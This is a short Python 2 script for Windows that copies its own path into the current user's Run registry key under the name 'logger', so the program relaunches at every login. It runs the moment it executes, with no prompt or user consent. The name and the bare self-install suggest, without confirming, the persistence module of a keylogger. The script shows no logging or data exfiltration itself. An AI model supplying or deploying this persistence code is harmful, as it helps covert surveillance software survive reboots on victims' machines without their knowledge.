import sys, os
from _winreg import *

def add_startup():
	if getattr(sys, 'frozen', False):
		fp = os.path.dirname(os.path.realpath(sys.executable))
	elif __file__:
		fp = os.path.dirname(os.path.realpath(__file__))
	file_name=sys.argv[0].split("\\")[-1]
	new_file_path= '"' + fp + "\\" + file_name + '"'
	keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

	key2change= OpenKey(HKEY_CURRENT_USER,
                            keyVal,0,KEY_ALL_ACCESS)

	SetValueEx(key2change, "logger",0,REG_SZ, new_file_path)

add_startup()
